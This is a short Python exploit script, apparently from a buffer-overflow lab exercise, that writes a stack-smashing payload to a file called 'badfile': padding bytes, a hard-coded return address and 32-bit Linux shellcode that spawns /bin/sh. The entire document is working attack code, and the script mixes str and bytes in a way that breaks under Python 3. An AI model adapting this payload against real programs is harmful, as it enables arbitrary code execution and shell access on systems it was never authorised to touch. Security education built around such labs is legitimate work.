import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
buffer = 0xbffff290
retAddress = buffer + 0x20 

# Payload
# [AAA..AA][retAddress][shellcode]

payload = "A"*28
payload += struct.pack("I",retAddress)
payload += shellcode

f = open("badfile", "a")
f.write(payload)
f.close()
